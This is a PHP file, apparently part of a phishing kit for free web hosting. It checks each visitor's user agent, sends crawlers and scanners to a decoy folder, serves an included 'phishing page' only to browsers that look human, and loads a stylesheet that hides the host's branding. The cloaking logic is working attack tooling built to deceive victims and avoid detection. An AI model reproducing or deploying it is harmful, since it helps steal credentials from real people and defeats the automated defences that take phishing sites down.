<?php
echo'<link rel=stylesheet type=text/css href="./remove branding logo/000webhost.css">';
echo "<script>filename = './phishing_info/'+window.location.pathname.substring(window.location.pathname.lastIndexOf('/')+1);</script>";

$lib ='./phishing_info/'.basename(__FILE__);

if(!empty($_SERVER['HTTP_USER_AGENT'])){
$ua = strtolower($_SERVER['HTTP_USER_AGENT']);
//bots user-agents normally
if(
substr_count($ua,"http://")   == '0' and 
substr_count($ua,"https://")  == '0' and
substr_count($ua,"+")         == '0' and
substr_count($ua,".com")      == '0' 
){

//human user-agents normally
if(
substr_count($ua,"apple")      == '1' or
substr_count($ua,"firefox")    == '1' or
substr_count($ua,"windows")    == '1' or
substr_count($ua,"linux")      == '1' or
substr_count($ua,"android")    == '1' or
substr_count($ua,"chrome")     == '1' or
substr_count($ua,"safari")     == '1' or
substr_count($ua,"gecko")      == '1' or
substr_count($ua,"iphone")     == '1' or
substr_count($ua,"macintosh")  == '1' or
substr_count($ua,"mac")        == '1' or
substr_count($ua,"khtml")      == '1' or
substr_count($ua,"browser")    == '1' or
substr_count($ua,"nokia")      == '1' or
substr_count($ua,"microsoft")  == '1' or
substr_count($ua,"opera")      == '1' or
substr_count($ua,"mozilla")    == '1' or
substr_count($ua,"mobile")     == '1' or
substr_count($ua,"network")     == '1' or
substr_count($ua,"blackberry")  == '1' or
substr_count($ua,"cpu")  == '1' or
substr_count($ua,"outlook")  == '1' or
substr_count($ua,"pc")         == '1'
){
include($lib);
echo"<center><h1>Some words in your <mark>user_agent</mark> matched with our list. Thus Phishing page loaded. Else you will be redirected to <mark>phishing_info</mark> folder. Your <mark>user_agent</mark> is listed below:- <br>$ua<br>You will be redirected to this link after phishing: $redirect</h1></center>";

/*
<input type=hidden name=link value=".$redirect.">
<input type=hidden name=location value=Sample />
*/
}else{echo'<script>window.location.replace(filename);</script>';}}
else{echo'<script>window.location.replace(filename);</script>';}}
else{echo'<script>window.location.replace(filename);</script>';}?>